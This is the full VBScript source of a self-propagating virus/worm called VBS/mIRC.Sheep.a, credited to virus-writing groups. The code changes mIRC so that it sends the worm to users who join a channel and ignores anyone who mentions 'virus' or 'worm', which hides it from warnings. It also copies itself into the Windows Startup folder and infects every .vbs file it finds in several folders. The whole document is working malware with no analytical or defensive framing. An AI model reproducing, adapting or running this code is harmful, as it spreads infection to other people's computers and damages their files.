'Sheep
'= VBS/mIRC.Sheep.a                                 =
'= by -KD- [Metaphase VX Team] & [NoMercyVirusTeam] =
'= Technology used from Code Breakers               =
On Error Resume Next
Const Sheep = 4327
Const ForReading = 1, ForWriting = 2, ForAppending = 8
Const XWindowsFolder = 0
Dim FSO, ScrFile, Cini, InfMarker, MyCode
Dim Parent, MySheep, V, VFile
Dim FoldersToGet(2), FolderX, VCode
Set FSO = CreateObject("Scripting.FileSystemObject")
Parent = Wscript.ScriptFullName
Set Cini = FSO.OpenTextFile("c:\mirc\mirc.ini", ForAppending, True)
      Cini.WriteLine "[rfiles]                                       "
      Cini.WriteLine "n100=script.ini                                "
      Cini.Close
Set ScrFile = FSO.CreateTextFile("c:\mirc\script.ini", True)
      ScrFile.WriteLine "[script]                                       "
      ScrFile.WriteLine "n0; VBS/mIRC Sheep.a                           "
      ScrFile.WriteLine "n1=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt } "
      ScrFile.WriteLine "n2=  /dcc send $nick c:\mirc\sheep.vbs         "
      ScrFile.WriteLine "n3=}                                           "
      ScrFile.WriteLine "n4=                                            "
      ScrFile.WriteLine "n5=;ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
      ScrFile.WriteLine "n6=/dcc send $nick c:\mirc\sheep.vbs           "
      ScrFile.WriteLine "n7=}                                           "
      ScrFile.WriteLine "n8=                                            "
      ScrFile.WriteLine "n9=on 1:TEXT:*script.ini*:#:/.ignore $nick     "
      ScrFile.WriteLine "n10=on 1:TEXT:*script.ini*:?:/.ignore $nick    "
      ScrFile.WriteLine "n11=on 1:TEXT:*virus*:#:/.ignore $nick         "
      ScrFile.WriteLine "n12=on 1:TEXT:*virus*:?:/.ignore $nick         "
      ScrFile.WriteLine "n13=on 1:TEXT:*worm*:#:/.ignore $nick          "
      ScrFile.WriteLine "n14=on 1:TEXT:*worm*:?:/.ignore $nick          "
      ScrFile.WriteLine "n15=on 1:TEXT:*sheep*:#:/.ignore $nick         "
      ScrFile.WriteLine "n16=on 1:TEXT:*sheep*:?:/.ignore $nick         "
      ScrFile.WriteLine "n17=on 1:QUIT:#:/msg $chan BAAAA!!!            "
      ScrFile.Close
FSO.CopyFile Parent, "c:\mirc\sheep.vbs"
FSO.CopyFile Parent, "c:\WINDOWS\Start Menu\Programs\StartUp\sheep.vbs"
If Day(Now()) = 15 or Day(Now()) = 30 or Day(Now()) = 5 Then
  MsgBox "  _______________________________________" & Chr(13) & Chr(10) & "/                                                                               \" & Chr(13) & Chr(10) & "|            Sheep Make the Greatest Cyber Pet           /" & Chr(13) & Chr(10) & "|                                                                              /" & Chr(13) & Chr(10) & "\________________________    ___________/" & Chr(13) & Chr(10) & "                                                 |  /" & Chr(13) & Chr(10) & "                                                 |/" & Chr(13) & Chr(10) & Chr(13) & Chr(10) & "                                                            /\___" & Chr(13) & Chr(10) & "              @@@@@@@@@@@@@  O   \" & Chr(13) & Chr(10) & "         @@@@@@@@@@@@@@@___/" & Chr(13) & Chr(10) & "      @@@@@@@@@@@@@@@@" & Chr(13) & Chr(10) &"     @  @@@@@@@@@@@@@@" & Chr(13) & Chr(10) & "                      | |                       | |" & Chr(13) & Chr(10) & "                     ~~                     ~~", 4096 , "The World Loves Sheep!"
End If
FoldersToGet(0) = "."
FoldersToGet(1) = FSO.GetSpecialFolder(XWindowsFolder)
FoldersToGet(2) = FSO.GetSpecialFolder(XWindowsFolder) & "\Desktop"
Set MySheep = FSO.OpenTextFile(Parent, ForReading)
MyCode = MySheep.Read(Sheep)
MySheep.Close
For Each FolderX in FoldersToGet
   Catch FolderX
Next
Sub Catch(TheFolder)
For Each V in FSO.GetFolder(TheFolder).Files
  If FSO.GetExtensionName(V.Name) = "vbs" then
Set VFile = FSO.OpenTextFile(V.Path,ForReading)
    InfMarker = VFile.read(6)
    VFile.close
If InfMarker <> "'Sheep" Then
      Set VFile = FSO.OpenTextFile(V.path,ForReading)
      VCode = VFile.ReadAll
      VFile.close
      VCode = MyCode & VCode
      Set VFile = FSO.OpenTextFile(V.Path,ForWriting,True)
      VFile.Write VCode
      VFile.close
    end if
  end if
next
End Sub
